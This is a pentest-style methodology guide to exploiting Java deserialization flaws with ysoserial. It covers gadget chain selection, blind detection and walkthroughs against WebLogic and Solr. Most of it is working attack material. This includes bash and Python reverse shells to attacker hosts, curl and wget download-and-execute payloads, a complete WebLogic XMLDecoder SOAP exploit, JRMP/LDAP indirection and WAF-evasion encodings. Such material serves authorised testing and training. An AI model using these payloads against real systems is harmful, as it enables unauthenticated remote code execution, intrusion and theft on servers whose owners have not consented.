# Java Deserialization with ysoserial Guide

> Practical methodology for exploiting Java insecure deserialization vulnerabilities using ysoserial, covering gadget chain selection, payload generation, blind detection, and full exploitation walkthroughs.

## Introduction and Objectives

Java deserialization vulnerabilities are among the most critical web application security issues, often leading directly to unauthenticated remote code execution. The ysoserial tool is the primary exploitation framework for Java deserialization, providing over 50 pre-built gadget chains targeting common Java libraries like Apache Commons Collections, Spring Framework, Hibernate, and many others.

This guide covers:

- Understanding Java serialization internals and the deserialization attack surface
- Selecting the correct gadget chain based on target classpath analysis
- Generating payloads with ysoserial for various delivery mechanisms
- Blind deserialization detection techniques when output is not visible
- End-to-end exploitation walkthrough from detection to RCE

### Prerequisites

Before working through this guide, ensure you have:

- Java Development Kit (JDK) 8+ installed (ysoserial requires Java to run)
- ysoserial JAR file downloaded from the official repository
- Access to Burp Suite or similar proxy for traffic manipulation
- A callback server (Burp Collaborator, interactsh, or custom DNS/HTTP listener)
- Basic understanding of Java object serialization format

## 1. Java Serialization Format Fundamentals

### Understanding the Binary Format

Java serialization produces a binary stream starting with magic bytes `0xACED` followed by the version number `0x0005`. When Base64-encoded, serialized Java objects always begin with `rO0AB`. Recognizing these signatures is the first step in identifying deserialization attack surfaces.

```bash
# Identify Java serialization magic bytes in raw traffic
echo "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==" | base64 -d | xxd | head -5

# Typical locations where serialized data appears:
# - HTTP cookies (JSESSIONID companion cookies)
# - POST parameters with Base64 data
# - HTTP headers (X-Serialized-Data, etc.)
# - RMI/JMX protocol communication
# - JMS message bodies
# - File upload metadata fields
```

### Serialization Stream Structure

The Java serialization stream follows the Object Serialization Stream Protocol. Key markers include:

- `TC_OBJECT` (0x73) -- marks the beginning of a new object
- `TC_CLASSDESC` (0x72) -- class descriptor with name, serial version UID, and field information
- `TC_STRING` (0x74) -- string reference
- `TC_REFERENCE` (0x71) -- reference to a previously seen object (enables object graph cycles)

Understanding this structure helps when modifying payloads at the binary level to bypass WAF rules that inspect stream content.

```bash
# Decode and inspect a suspected Java serialization payload
echo "SUSPECT_BASE64_HERE" | base64 -d | xxd | head -20

# Look for class names embedded in the stream
echo "SUSPECT_BASE64_HERE" | base64 -d | strings | grep -i 'java\|apache\|spring\|hibernate'

# Extract all class names from a serialized object
echo "SUSPECT_BASE64_HERE" | base64 -d | \
  python3 -c "
import sys, re
data = sys.stdin.buffer.read()
# Find class name patterns in Java serialization
classes = re.findall(rb'[\w.]+(?:Transformer|Collection|Map|List|Set|Bean|Factory)', data)
for c in set(classes):
    print(c.decode('utf-8', errors='ignore'))
"
```

## 2. Gadget Chain Selection

### Commons Collections Chains

The Apache Commons Collections library provides the most widely exploited gadget chains. The chain you select depends on the library version and JVM configuration.

| Chain | Library Version | Notes |
|-------|----------------|-------|
| CommonsCollections1 | CC 3.1 - 3.2.1 | Uses `InvokerTransformer`; requires `AnnotationsInvokerHandler`; does not work with SecurityManager |
| CommonsCollections2 | CC4 4.0 | Uses `TransformingComparator` with `PriorityQueue`; requires CommonsCollections4 |
| CommonsCollections3 | CC 3.1 - 3.2.1 | Uses `InstantiateTransformer` with `TrAXFilter`; avoids `InvokerTransformer` in some paths |
| CommonsCollections4 | CC4 4.0 | Combines CC2 and CC3 techniques for CC4-specific path |
| CommonsCollections5 | CC 3.1 - 3.2.1 | Uses `InvokerTransformer` via `LazyMap` + `TiedMapEntry` + `BadAttributeValueExpException`; works with SecurityManager |
| CommonsCollections6 | CC 3.1 - 3.2.1 | Uses `HashSet` + `HashMap` + `TiedMapEntry`; very reliable |
| CommonsCollections7 | CC 3.1 - 3.2.1 | Uses `Hashtable` + `AbstractMap` + `ChainedTransformer`; alternative entry point |

```bash
# List all available ysoserial chains
java -jar ysoserial.jar 2>&1 | head -60

# Generate each CommonsCollections variant for testing
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
             CommonsCollections4 CommonsCollections5 CommonsCollections6 \
             CommonsCollections7; do
  echo "=== $chain ==="
  java -jar ysoserial.jar $chain "nslookup ${chain}.attacker.com" 2>/dev/null | base64 -w0
  echo ""
done
```

### Spring and Framework Chains

When Commons Collections is not available, Spring, Hibernate, and other framework-specific chains provide alternative exploitation paths.

```bash
# Spring framework chains
java -jar ysoserial.jar Spring1 'id' | base64 -w0
java -jar ysoserial.jar Spring2 'id' | base64 -w0

# Hibernate chains (common in enterprise applications)
java -jar ysoserial.jar Hibernate1 'whoami' | base64 -w0
java -jar ysoserial.jar Hibernate2 'whoami' | base64 -w0

# Other useful chains
java -jar ysoserial.jar Groovy1 'id' | base64 -w0        # Groovy runtime
java -jar ysoserial.jar Clojure 'id' | base64 -w0        # Clojure runtime
java -jar ysoserial.jar Jdk7u21 'id' | base64 -w0       # JDK-only, no external deps
java -jar ysoserial.jar JBossInterceptors1 'id' | base64 -w0  # JBoss
java -jar ysoserial.jar RESTEasy1 'id' | base64 -w0      # RESTEasy JAX-RS
```

## 3. Payload Generation Techniques

### Standard Command Execution

```bash
# Basic command execution
java -jar ysoserial.jar CommonsCollections5 'whoami' > payload.bin

# Base64 for HTTP transport
java -jar ysoserial.jar CommonsCollections5 'whoami' | base64 -w0

# URL-safe Base64 for GET parameters
java -jar ysoserial.jar CommonsCollections5 'whoami' | base64 -w0 | tr '+/' '-_'

# Gzip compression for large payloads or WAF evasion
java -jar ysoserial.jar CommonsCollections5 'whoami' | gzip | base64 -w0

# Write payload to file for multipart upload
java -jar ysoserial.jar CommonsCollections5 'whoami' > /tmp/serialized_payload.bin
```

### Reverse Shell Payloads

Java's `Runtime.exec()` does not handle shell redirects and pipes directly. You must use bash invocation wrappers.

```bash
# Bash reverse shell via ysoserial
java -jar ysoserial.jar CommonsCollections5 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|bash' \
  | base64 -w0

# The base64 string decodes to: bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
# Generate the base64 command:
echo -n 'bash -i >& /dev/tcp/attacker/4444 0>&1' | base64 -w0

# Alternative: use curl to download and execute a script
java -jar ysoserial.jar CommonsCollections6 \
  'curl http://attacker/shell.sh|bash' | base64 -w0

# Alternative: use wget to download payload
java -jar ysoserial.jar CommonsCollections5 \
  'wget http://attacker/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p' \
  | base64 -w0
```

### Handling Spaces and Special Characters

```bash
# Use ${IFS} as space replacement when spaces cause issues
java -jar ysoserial.jar CommonsCollections5 \
  'bash${IFS}-c${IFS}"bash${IFS}-i${IFS}>&${IFS}/dev/tcp/attacker/4444${IFS}0>&1"' \
  | base64 -w0

# Use Python for complex command handling
java -jar ysoserial.jar CommonsCollections5 \
  'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"attacker\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"' \
  | base64 -w0
```

## 4. Blind Deserialization Detection

### DNS-Based Detection with GadgetProbe

GadgetProbe is essential for blind deserialization scenarios where you cannot see error messages or command output.

```bash
# Basic GadgetProbe classpath enumeration
java -cp gadgetprobe.jar GadgetProbe \
  --dns-callback your-callback.burpcollaborator.net \
  --input captured_serialized_data.bin

# GadgetProbe will attempt to load classes and report which ones
# are available via DNS queries to your callback domain

# Create a custom wordlist targeting specific libraries
cat > cc_classes.txt << 'EOF'
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors.InvokerTransformer
org.apache.commons.collections.functors.ChainedTransformer
org.apache.commons.collections.map.LazyMap
org.apache.commons.collections.keyvalue.TiedMapEntry
org.apache.commons.collections4.functors.InvokerTransformer
org.apache.commons.collections4.map.LazyMap
EOF

java -cp gadgetprobe.jar GadgetProbe \
  --dns-callback callback.attacker.com \
  --wordlist cc_classes.txt \
  --input base64_payload_here
```

### Time-Based Detection

```bash
# Generate a 5-second delay payload
java -jar ysoserial.jar CommonsCollections5 'sleep 5' | base64 -w0

# Measure baseline response time
time curl -s -o /dev/null -w '%{time_total}' \
  -H 'Cookie: session=ORIGINAL_VALUE' \
  http://target/app

# Measure payload response time (should be 5+ seconds longer)
time curl -s -o /dev/null -w '%{time_total}' \
  -H 'Cookie: session=BASE64_PAYLOAD_HERE' \
  http://target/app

# Automate timing comparison
for i in 1 2 3; do
  echo -n "Baseline $i: "
  time curl -s -o /dev/null http://target/app 2>&1 | grep real
  echo -n "Payload $i: "
  time curl -s -o /dev/null -H 'Cookie: session=SLEEP_PAYLOAD' http://target/app 2>&1 | grep real
done
```

## 5. Full Exploitation Walkthrough

### Scenario: WebLogic Deserialization (CVE-2017-10271)

This walkthrough demonstrates a complete exploitation chain against a vulnerable Oracle WebLogic server.

```bash
# Step 1: Identify the target as WebLogic
curl -sI http://target:7001/ | grep -i server
# Server: WebLogic

# Step 2: Verify vulnerability endpoint exists
curl -s -o /dev/null -w '%{http_code}' \
  http://target:7001/wls-wsat/CoordinatorPortType
# 200 OK confirms endpoint exists

# Step 3: Set up callback infrastructure
# Terminal 1: Start DNS/HTTP callback listener
# Use Burp Collaborator, interactsh, or:
python3 -m http.server 8000

# Terminal 2: Start marshalsec LDAP server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389

# Step 4: Compile and serve malicious class
cat > Exploit.java << 'JAVAEOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nslookup attacker.com");
        } catch (Exception e) {}
    }
}
JAVAEOF
javac Exploit.java

# Step 5: Generate ysoserial payload
java -jar ysoserial.jar Jdk7u21 'nslookup weblogic.attacker.com' | base64 -w0

# Step 6: Send SOAP payload to vulnerable endpoint
curl -X POST http://target:7001/wls-wsat/CoordinatorPortType \
  -H 'Content-Type: text/xml' \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>cmd</string></void>
            <void index="1"><string>/c</string></void>
            <void index="2"><string>nslookup pwned.attacker.com</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# Step 7: Verify callback received
# Check DNS callback server for query from target IP

# Step 8: Escalate to reverse shell
# Generate reverse shell payload
java -jar ysoserial.jar CommonsCollections5 \
  'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|bash' | base64 -w0
```

### Scenario: Apache Solr Deserialization

```bash
# Step 1: Detect Solr instance
curl -s http://target:8983/solr/admin/cores | grep -o '<str name="version">[^<]*</str>'

# Step 2: Test for JMX RMI deserialization (CVE-2019-12409)
# Generate JRMP client payload pointing to attacker RMI registry
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0

# Step 3: Start ysoserial JRMP listener
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 \
  CommonsCollections5 'curl http://attacker/solr-rce'

# Step 4: Send payload via Solr JMX interface
# Use Solr's /admin/cores endpoint with crafted parameters

# Step 5: Monitor callback for execution confirmation
```

## 6. Advanced Techniques

### Custom Class Loading via TemplatesImpl

```bash
# TemplatesImpl gadget loads custom bytecode via ClassLoader
# Useful when Runtime.exec() is filtered

# Step 1: Create custom Java class
cat > ShellLoader.java << 'JAVAEOF'
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class ShellLoader extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("id");
        } catch (Exception e) {}
    }
    public void transform(DOM d, SerializationHandler h) {}
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) {}
}
JAVAEOF

# Step 2: Compile to bytecode
javac ShellLoader.java

# Step 3: Use ysoserial with TemplatesImpl-based chain
java -jar ysoserial.jar CommonsCollections2 'id' | base64 -w0
# CommonsCollections2 uses TemplatesImpl internally
```

### Multi-Hop Exploitation

```bash
# When direct deserialization is blocked, use indirection
# Step 1: JRMP payload (contains no dangerous classes, just a URL)
java -jar ysoserial.jar JRMPClient 'attacker:1099' | base64 -w0

# Step 2: Attacker's JRMP listener serves the actual exploit
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 \
  CommonsCollections6 'reverse_shell_command'

# Step 3: If JRMP is also blocked, try LDAP indirection
java -jar ysoserial.jar Jdk7u21 'ldap://attacker:1389/obj' | base64 -w0

# LDAP server serves remote class loading
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker:8000 1389
```

## References and Resources

- **ysoserial GitHub**: https://github.com/frohoff/ysoserial -- Official ysoserial repository with all gadget chains
- **GadgetProbe**: https://github.com/BishopFox/GadgetProbe -- Classpath enumeration tool for blind deserialization
- **marshalsec**: https://github.com/mbechler/marshalsec -- Java marshalling/deserialization research tool
- **Java Deserialization Cheat Sheet**: https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet -- Comprehensive cheat sheet
- **OWASP Deserialization Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html -- Defensive guidance
- ** ysoserial.net**: https://github.com/pwntester/ysoserial.net -- .NET counterpart for ysoserial
- **PortSwigger Deserialization Labs**: https://portswigger.net/web-security/deserialization -- Hands-on practice labs
- **NCC Group Java Deserialization Whitepaper**: https://www.nccgroup.com/us/research-blog/java-deserialization-vulnerabilities/ -- In-depth technical analysis
- **CVE-2015-4852 (WebLogic)**: Original Java deserialization CVE that started the trend
- **CVE-2017-10271 (WebLogic SOAP)**: WebLogic WLS-WSAT component XMLDecoder deserialization

## Appendix: Gadget Chain Quick Reference

### Commons Collections Chain Selection Matrix

Choosing the correct CommonsCollections chain depends on library version, JVM configuration, and whether a SecurityManager is present. Use this matrix to rapidly select the right chain during engagements.

| Chain | CC Version | SecurityManager | Key Gadget | Reliability |
|-------|-----------|----------------|------------|-------------|
| CC1 | 3.1-3.2.1 | No | InvokerTransformer via AnnotationInvocationHandler | Medium |
| CC2 | 4.0 | No | TransformingComparator + PriorityQueue | High |
| CC3 | 3.1-3.2.1 | No | InstantiateTransformer + TrAXFilter | High |
| CC4 | 4.0 | No | ChainedTransformer + TransformingComparator | High |
| CC5 | 3.1-3.2.1 | Yes | InvokerTransformer via LazyMap + BadAttributeValueExpException | High |
| CC6 | 3.1-3.2.1 | Yes | HashSet + HashMap + TiedMapEntry | Very High |
| CC7 | 3.1-3.2.1 | Yes | Hashtable + AbstractMap + ChainedTransformer | High |

### Common Error Messages and Diagnoses

When ysoserial payloads fail, the resulting error messages can help diagnose the root cause and guide chain selection.

| Error Message | Cause | Resolution |
|---------------|-------|------------|
| `ClassNotFoundException: org.apache.commons.collections.functors.InvokerTransformer` | CC3 not on classpath, might be CC4 | Try CommonsCollections2 or CommonsCollections4 |
| `IllegalAccessException` | SecurityManager blocking reflection | Use CC5, CC6, or CC7 which work with SecurityManager |
| `java.io.InvalidClassException: local class incompatible` | serialVersionUID mismatch | Target has different library version; try alternative chain |
| `StreamCorruptedException` | Payload encoding issue | Verify Base64 decoding; try gzip-wrapped payload |
| `ClassCastException` | Chain partially executed but wrong type | Try different chain targeting same sink |
| No error, no callback | Deserialization not happening | Verify input vector actually triggers readObject() |

### Payload Encoding Decision Tree

Different delivery vectors require different encoding. Use this decision tree to select the correct encoding.

```bash
# Decision tree for payload encoding:
# 1. Is the payload in a cookie or HTTP header? -> Base64
# 2. Is the payload in a URL GET parameter? -> URL-safe Base64 (tr '+/' '-_')
# 3. Is the payload in a POST body? -> Raw binary or Base64
# 4. Is there a WAF? -> Gzip compress first, then Base64
# 5. Is it for WebLogic T3? -> Raw binary with T3 protocol header
# 6. Is it for JBoss JMX? -> Raw binary with Content-Type: application/x-java-serialized-object
# 7. Is it for file upload? -> Raw binary file

# Quick encoding examples for each scenario:
# Cookie:
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0

# GET parameter:
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0 | tr '+/' '-_'

# WAF bypass with compression:
java -jar ysoserial.jar CommonsCollections6 'id' | gzip | base64 -w0

# Double URL-encoding for Tomcat:
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0 | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(urllib.parse.quote(sys.stdin.read().strip()),safe=''))"
```
